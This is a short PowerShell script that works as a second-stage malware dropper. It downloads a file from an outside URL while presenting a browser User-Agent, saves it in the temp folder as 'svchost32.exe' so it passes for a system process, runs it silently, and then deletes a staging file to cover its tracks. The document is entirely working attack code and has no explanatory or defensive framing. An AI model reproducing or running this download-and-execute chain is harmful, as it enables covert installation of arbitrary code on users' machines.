
$RemoteUrl = 'https://adatum.com/update.dat'
$DropPath = "$env:TEMP\svchost32.exe"
$StageTimeout = 177
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Invoke-Stage2Download -SourceUrl $RemoteUrl -DestinationPath $DropPath -TimeoutSec $StageTimeout -UserAgent $UserAgent
if ($TransferResult) {
    Start-Process -FilePath $DropPath -ErrorAction SilentlyContinue
}

$StageMarker = "stage-34"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
